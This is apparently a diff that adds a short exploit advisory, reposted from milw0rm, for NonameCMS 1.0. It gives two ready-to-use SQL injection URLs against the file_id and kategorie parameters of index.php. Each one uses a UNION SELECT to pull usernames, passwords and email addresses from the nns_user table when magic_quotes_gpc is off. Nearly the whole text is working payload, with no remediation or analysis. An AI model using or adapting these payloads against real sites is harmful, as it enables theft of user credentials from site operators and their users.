@@ -1,0 +1,17 @@
+Author: ~!Dok_tOR!~
+Date found: 30.09.08
+Product: NonameCMS
+Version: 1.0
+URL: noname-cms.org
+Vulnerability Class: SQL Injection
+Condition: magic_quotes_gpc = Off
+
+Exploit 1:
+
+http://localhost/[installdir]/index.php?action=detailansicht&file_id=-1'+union+select+1,2,3,4,5,6,concat_ws(0x3a,benutzername,passwort,email),8+from+nns_user/*
+
+Exploit 2:
+
+http://localhost/[installdir]/index.php?action=kategorien&kategorie=-1'+union+select+1,2,user(),concat_ws(0x3a,benutzername,passwort,email),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26+from+nns_user/*
+
+# milw0rm.com [2008-10-01]
